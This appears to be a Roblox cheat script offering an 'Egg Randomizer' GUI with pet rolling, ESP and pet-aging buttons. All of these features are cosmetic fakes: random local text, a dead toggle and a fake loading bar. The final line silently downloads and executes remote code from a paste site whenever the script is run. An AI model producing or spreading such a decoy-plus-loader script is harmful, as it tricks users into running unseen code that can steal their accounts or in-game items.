-- Destroy existing GUI if any
pcall(function()
	if game.CoreGui:FindFirstChild("GardenInjectedGUI") then
		game.CoreGui.GardenInjectedGUI:Destroy()
	end
end)

-- Create main GUI
local gui = Instance.new("ScreenGui")
gui.Name = "GardenInjectedGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = game:GetService("CoreGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 260)
frame.Position = UDim2.new(0.5, -110, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

-- Title
local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 0, 25)
label.BackgroundTransparency = 1
label.Text = "üêæ Egg Randomizer üêæ"
label.Font = Enum.Font.GothamBold
label.TextSize = 18
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextXAlignment = Enum.TextXAlignment.Center
label.Parent = frame

-- Subtitle
local subLabel = Instance.new("TextLabel")
subLabel.Size = UDim2.new(1, 0, 0, 18)
subLabel.Position = UDim2.new(0, 0, 0, 25)
subLabel.BackgroundTransparency = 1
subLabel.Text = "Made by: Miszua"
subLabel.Font = Enum.Font.Gotham
subLabel.TextSize = 14
subLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
subLabel.TextXAlignment = Enum.TextXAlignment.Center
subLabel.Parent = frame

-- Button Factory
local function createButton(name, y, text, color)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, 0, 0, 30)
	b.Position = UDim2.new(0, 0, 0, y)
	b.BackgroundColor3 = color
	b.Text = text
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.Gotham
	b.TextSize = 16
	b.AutoButtonColor = true
	b.Parent = frame
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	return b
end

local rollButton = createButton("Roll", 50, "üé≤ AUTO ROLL ZEN EGG", Color3.fromRGB(80, 130, 90))
local espButton = createButton("ESP", 85, "üëÅÔ∏è ESP: OFF", Color3.fromRGB(100, 100, 130))
local ageButton = createButton("Age", 120, "üê∂ AUTO AGE 50 PET", Color3.fromRGB(160, 110, 60))

-- Result Display
local resultLabel = Instance.new("TextLabel")
resultLabel.Size = UDim2.new(1, 0, 0, 60)
resultLabel.Position = UDim2.new(0, 0, 0, 160)
resultLabel.BackgroundTransparency = 1
resultLabel.Text = ""
resultLabel.Font = Enum.Font.GothamSemibold
resultLabel.TextSize = 15
resultLabel.TextColor3 = Color3.fromRGB(255, 255, 150)
resultLabel.TextXAlignment = Enum.TextXAlignment.Center
resultLabel.TextYAlignment = Enum.TextYAlignment.Top
resultLabel.TextWrapped = true
resultLabel.Parent = frame

-- ROLL ZEN EGG Logic
rollButton.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local petNames = {"Shiba Inu", "Nihonzaru", "Tanuki", "Tanchuzuru", "Kappa", "Kitsune"}
	local eggRange, foundEgg = 20, nil

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") and obj.Name:lower():find("egg") then
			if (obj.Position - hrp.Position).Magnitude <= eggRange then
				foundEgg = obj
				break
			end
		end
	end

	if not foundEgg then
		resultLabel.Text = "‚ùå Not near any egg!"
		return
	end

	local totalTime, delay, timer, i = 1.5, 0.05, 0, 1
	while timer < totalTime do
		resultLabel.Text = "üé∞ Rolling: " .. petNames[i]
		i = (i % #petNames) + 1
		task.wait(delay)
		timer += delay
	end

	local finalPet = petNames[math.random(1, #petNames)]
	local age = math.random(1, 50)
	local weight = string.format("%.2f", math.random(100, 1000)/100)
	resultLabel.Text = string.format("üéâ You rolled: %s\nAge: %d | Weight: %s kg", finalPet, age, weight)

	if foundEgg:FindFirstChild("PetNameBillboard") then
		foundEgg.PetNameBillboard:Destroy()
	end

	local bb = Instance.new("BillboardGui", foundEgg)
	bb.Name = "PetNameBillboard"
	bb.Size = UDim2.new(0, 250, 0, 90)
	bb.StudsOffset = Vector3.new(0, 4, 0)
	bb.AlwaysOnTop = true
	bb.Adornee = foundEgg

	local bbText = Instance.new("TextLabel", bb)
	bbText.Size = UDim2.new(1, 0, 1, 0)
	bbText.BackgroundTransparency = 1
	bbText.Text = string.format("üéâ %s\nüìÖ Age: %d | ‚öñÔ∏è %s kg", finalPet, age, weight)
	bbText.Font = Enum.Font.GothamBold
	bbText.TextSize = 32
	bbText.TextColor3 = Color3.fromRGB(0, 120, 255)
	bbText.TextTransparency = 0.2
	bbText.TextStrokeTransparency = 0.5
	bbText.TextWrapped = true
end)

-- ESP
local espEnabled = false
espButton.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled
	espButton.Text = espEnabled and "üëÅÔ∏è ESP: ON" or "üëÅÔ∏è ESP: OFF"
end)

-- AGE 50 PET w/ loading + pet selector
ageButton.MouseButton1Click:Connect(function()
	local loading = Instance.new("Frame", gui)
	loading.Size = UDim2.new(0, 300, 0, 100)
	loading.Position = UDim2.new(0.5, -150, 0.5, -50)
	loading.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	loading.BackgroundTransparency = 0.1
	loading.ZIndex = 9999
	loading.AnchorPoint = Vector2.new(0.5, 0.5)
	Instance.new("UICorner", loading).CornerRadius = UDim.new(0, 8)

	local status = Instance.new("TextLabel", loading)
	status.Size = UDim2.new(1, 0, 1, 0)
	status.BackgroundTransparency = 1
	status.Text = "AUTO AGE 50 PET IS FOR DIVINE ONLY!\nLoading: 0%"
	status.Font = Enum.Font.GothamBold
	status.TextColor3 = Color3.new(1, 1, 1)
	status.TextScaled = true
	status.TextWrapped = true

	for i = 1, 100 do
		status.Text = "AUTO AGE 50 PET IS FOR DIVINE ONLY!\nLoading: " .. i .. "%"
		task.wait(0.1)
	end

	loading:Destroy()

	-- Pet picker
	local petGui = Instance.new("ScreenGui", gui)
	local main = Instance.new("Frame", petGui)
	main.Size = UDim2.new(0, 260, 0, 320)
	main.Position = UDim2.new(0.5, -130, 0.5, -160)
	main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	main.Active = true
	main.Draggable = true
	Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)

	local scroll = Instance.new("ScrollingFrame", main)
	scroll.Size = UDim2.new(1, -10, 1, -10)
	scroll.Position = UDim2.new(0, 5, 0, 5)
	scroll.CanvasSize = UDim2.new(0, 0, 0, 500)
	scroll.ScrollBarThickness = 6
	scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

	local uiList = Instance.new("UIListLayout", scroll)
	uiList.Padding = UDim.new(0, 6)

	local pets = {"Butterfly", "Raccoon", "Queen Bee", "Spinosaurus", "T-Rex", "Disco Bee", "Mimic Octopus", "Dragonfly", "Fennec Fox", "Red Fox", "Kitsune", "Corrupt Kitsune"}
	for _, pet in ipairs(pets) do
		local btn = Instance.new("TextButton", scroll)
		btn.Size = UDim2.new(1, -10, 0, 30)
		btn.Text = pet
		btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
		btn.TextColor3 = Color3.new(1, 1, 1)
		btn.Font = Enum.Font.Gotham
		btn.TextSize = 16
		Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

		btn.MouseButton1Click:Connect(function()
			print("Selected pet:", pet)
			petGui:Destroy()
		end)
	end
end)


loadstring(game:HttpGet("https://pastefy.app/roIa67SA/raw"))()
